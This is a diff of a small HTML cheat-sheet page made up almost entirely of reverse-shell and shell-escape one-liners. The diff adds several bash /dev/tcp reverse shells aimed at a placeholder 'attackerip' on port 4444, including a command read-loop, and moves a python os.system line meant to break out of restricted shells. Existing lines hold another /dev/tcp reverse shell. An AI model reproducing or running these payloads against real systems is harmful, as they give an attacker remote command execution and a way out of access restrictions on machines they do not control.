@@ -6,9 +6,14 @@
 </head><body>bash -i &gt;&amp; /dev/tcp/&lt;LIP&gt;/&lt;LPORT&gt; 0&gt;&amp;1<br/>
 <br/>
 <br/>
-echo os.system('/bin/bash')&#09;&#09;&#09;&#09;&#09;&#09;works for python based shells (ie lshell/limitedshell)<br/>
-<br/>
-<br/>
-<br/>
 exec /bin/bash 0&amp;0 2&gt;&amp;0<br/>
-</body></html>
+&nbsp; OR<br/>
+0&lt;&amp;196;exec 196&lt;&gt;/dev/tcp/attackerip/4444; sh &lt;&amp;196 &gt;&amp;196 2&gt;&amp;196<br/>
+&nbsp; OR<br/>
+exec 5&lt;&gt;/dev/tcp/attackerip/4444<br/>
+cat &lt;&amp;5 | while read line; do $line 2&gt;&amp;5 &gt;&amp;5; done &nbsp;# or:<br/>
+while read line 0&lt;&amp;5; do $line 2&gt;&amp;5 &gt;&amp;5; done<br/>
+<br/>
+<br/>
+<br/>
+echo os.system('/bin/bash')&#09;&#09;&#09;&#09;&#09;&#09;works for python based shells (ie lshell/limitedshell)</body></html>
